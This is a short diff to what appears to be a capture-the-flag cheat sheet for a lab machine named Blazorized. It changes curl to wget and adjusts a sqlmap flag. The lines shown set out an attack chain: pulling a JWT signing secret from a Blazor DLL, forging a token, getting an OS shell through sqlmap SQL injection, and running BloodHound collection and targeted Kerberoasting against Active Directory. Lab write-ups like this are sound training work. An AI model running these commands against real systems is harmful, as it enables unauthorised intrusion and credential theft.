@@ -21,10 +21,10 @@ A Blazor WebAssembly DLL leaks the JWT signing secret; forge an administrator to
 
 ```bash
 nmap -Pn -sCV -p80,445,3389,5985 <IP>
-curl -s http://blazorized.htb/_framework/Blazorized.Client.dll -o client.dll
+wget -q http://blazorized.htb/_framework/Blazorized.Client.dll -O client.dll
 strings -el client.dll | grep -iE "secret|key|jwt"
 python3 jwt_tool.py <TOKEN> -S hs256 -p "<SECRET>"
-sqlmap -u "http://blazorized.htb/api/..." --os-shell
+sqlmap --url "http://blazorized.htb/api/..." --os-shell
 # AD
 bloodhound-python -u <USER> -p "<PASS>" -d blazorized.htb -c All
 targetedKerberoast.py -d blazorized.htb -u <USER> -p "<PASS>"
